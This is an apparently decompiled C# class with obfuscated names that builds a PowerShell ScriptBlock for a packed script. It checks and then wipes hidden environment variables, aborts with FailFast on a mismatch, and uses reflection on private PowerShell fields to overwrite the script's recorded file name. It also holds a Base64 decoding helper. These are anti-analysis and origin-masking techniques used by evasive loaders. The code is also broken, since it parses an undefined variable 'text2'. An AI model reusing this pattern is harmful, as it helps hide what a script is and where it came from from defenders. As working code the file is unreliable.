using System;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Language;
using System.Reflection;
using System.Text;

namespace _32;

public static class _88
{
	public static ScriptBlock _74(string path)
	{
		return _46(path);
	}

	private static ScriptBlock _46(string _52)
	{
		string environmentVariable = Environment.GetEnvironmentVariable("zumsel", EnvironmentVariableTarget.Process);
		Environment.SetEnvironmentVariable("zumsel", "", EnvironmentVariableTarget.Process);
		string environmentVariable2 = Environment.GetEnvironmentVariable("willi", EnvironmentVariableTarget.Process);
		Environment.SetEnvironmentVariable("willi", "", EnvironmentVariableTarget.Process);
		if (!string.Equals(_52, environmentVariable))
		{
			Environment.FailFast("Invalid Operation");
		}
		string location = Assembly.GetExecutingAssembly().Location;
		string text = "\"\"" + Path.GetFileName(location) + "\"\"";
		Token[] array = default(Token[]);
		ParseError[] array2 = default(ParseError[]);
		ScriptBlockAst val = Parser.ParseInput(text2, ref array, ref array2);
		IScriptExtent extent = ((Ast)val).Find((Func<Ast, bool>)((Ast item) => item is ScriptBlockAst), true).get_Extent();
		FieldInfo field = ((object)extent).GetType().GetField("_positionHelper", BindingFlags.Instance | BindingFlags.NonPublic);
		object value = field.GetValue(extent);
		FieldInfo field2 = value.GetType().GetField("_filename", BindingFlags.Instance | BindingFlags.NonPublic);
		field2.SetValue(value, location);
		return val.GetScriptBlock();
	}

	private static string _93(string str)
	{
		return Encoding.Unicode.GetString(Convert.FromBase64String(str));
	}
}